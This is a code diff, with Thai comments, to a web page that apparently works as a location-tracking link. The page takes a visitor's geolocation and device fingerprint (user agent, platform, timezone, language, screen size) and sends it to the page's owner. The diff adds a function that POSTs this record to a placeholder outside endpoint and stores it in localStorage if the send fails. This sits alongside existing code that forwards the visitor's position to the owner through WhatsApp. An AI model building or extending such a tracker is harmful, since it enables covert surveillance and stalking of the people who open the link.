@@ -386,6 +386,31 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
                 return;
             }
             
+            // สร้างข้อมูล JSON
+            const locationData = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                latitude: currentLocation.latitude,
+                longitude: currentLocation.longitude,
+                accuracy: currentLocation.accuracy,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: {
+                    width: screen.width,
+                    height: screen.height
+                },
+                location: {
+                    googleMaps: `https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.longitude}`,
+                    coordinates: [currentLocation.longitude, currentLocation.latitude]
+                }
+            };
+            
+            // ส่งข้อมูลไปยัง API
+            sendToAPI(locationData);
+            
             // สร้างข้อความที่จะส่งมาหาเรา
             const ownerMessage = `🚨 ตำแหน่งใหม่จากลิงก์!
             
@@ -417,6 +442,39 @@ https://www.google.com/maps?q=${currentLocation.latitude},${currentLocation.long
             setTimeout(() => {
                 window.open(ownerWhatsappUrl, '_blank');
             }, 2000);
+        }
+        
+        function sendToAPI(data) {
+            // ส่งข้อมูลไปยัง API (ใช้ webhook หรือ API endpoint)
+            const apiUrl = 'https://your-api-endpoint.com/api/location';
+            
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('✅ ส่งข้อมูลไปยัง API เรียบร้อย:', result);
+            })
+            .catch(error => {
+                console.error('❌ เกิดข้อผิดพลาดในการส่งข้อมูล:', error);
+                // เก็บข้อมูลใน localStorage เป็น backup
+                saveToLocalStorage(data);
+            });
+        }
+        
+        function saveToLocalStorage(data) {
+            try {
+                const existingData = JSON.parse(localStorage.getItem('locationData') || '[]');
+                existingData.push(data);
+                localStorage.setItem('locationData', JSON.stringify(existingData));
+                console.log('💾 เก็บข้อมูลใน localStorage:', data);
+            } catch (error) {
+                console.error('❌ เกิดข้อผิดพลาดในการเก็บข้อมูล:', error);
+            }
         }
         
         function sendLocationData() {
